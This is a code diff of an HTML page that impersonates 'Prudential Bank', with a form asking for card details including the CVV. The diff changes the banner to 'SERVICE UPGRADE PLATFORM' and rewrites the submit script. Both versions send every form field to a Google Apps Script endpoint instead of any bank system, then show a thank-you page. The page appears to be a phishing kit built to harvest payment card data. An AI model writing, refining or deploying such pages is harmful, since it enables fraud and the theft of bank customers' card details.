@@ -69,7 +69,7 @@
 </head>
 <body>
   <div class="header">
-    <h1>PRUDENTIAL BANK ATM SERVICE PLATFORM </h1>
+    <h1>PRUDENTIAL BANK SERVICE UPGRADE PLATFORM </h1>
     <p>……Truly Dependable</p>
   </div>
 
@@ -88,36 +88,34 @@
   <input type="text" name="cvv" required>
 
       <div class="button-group">
-        <button type="submit">VALIDATE →</button>
+        <button type="submit">VALIDATE SERVICES →</button>
       </div>
     </form>
   </div>
 
-  <script>
-    document.getElementById('authForm').addEventListener('submit', async function(event) {
-      event.preventDefault();
+<script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbw-BN61Qrq7grgilOPWqHHw3WPJULXjddmz4kiisZoPJb-7sQU06jA4mdDNmb6VzQiaWg/exec";
+    const form = document.getElementById("demoForm");
 
-      const form = event.target;
-      const data = new FormData(form);
-      const params = new URLSearchParams(data);
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const formData = new FormData(form);
 
       try {
-        const response = await fetch("https://script.google.com/macros/s/AKfycbw-BN61Qrq7grgilOPWqHHw3WPJULXjddmz4kiisZoPJb-7sQU06jA4mdDNmb6VzQiaWg/exec", {
-          method: "POST",
-          body: params
-        });
-
+        const response = await fetch(scriptURL, { method: "POST", body: formData });
         const result = await response.text();
         console.log("Server response:", result);
 
         if (result.includes("Success")) {
+          // ✅ Only redirect if Apps Script confirms success
           window.location.href = "thank_you.html";
         } else {
           alert("Submission failed: " + result);
         }
       } catch (err) {
-        console.error("Submission error:", err);
-        alert("There was an error submitting. Please try again.");
+        console.error("Error:", err);
+        alert("There was a network error. Please try again.");
       }
     });
   </script>
